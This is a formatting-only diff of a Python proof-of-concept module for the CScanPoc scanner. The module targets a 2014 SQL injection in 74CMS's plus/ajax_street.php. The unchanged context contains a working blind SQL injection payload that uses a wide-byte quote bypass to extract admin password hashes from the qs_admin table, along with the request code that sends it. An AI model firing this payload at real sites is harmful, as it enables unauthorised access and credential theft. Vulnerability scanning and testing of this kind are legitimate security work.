@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 
+
 class Vuln(ABVuln):
-    vuln_id = '74CMS_0005' # 平台漏洞编号，留空
+    vuln_id = '74CMS_0005'  # 平台漏洞编号，留空
     name = '骑士CMS SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2014-11-11'  # 漏洞公布时间
     desc = '''
         代码出现在 plus/ajax_street.php文件中
@@ -33,7 +34,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             payload = "/upload/plus/ajax_street.php?act=key&key=s%e9%8c%a6' or cast(ascii(substring((select md5(c) from qs_admin),1,1))=97 as signed) %23"
             url = self.target + payload
             r = requests.post(url)
@@ -47,6 +48,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
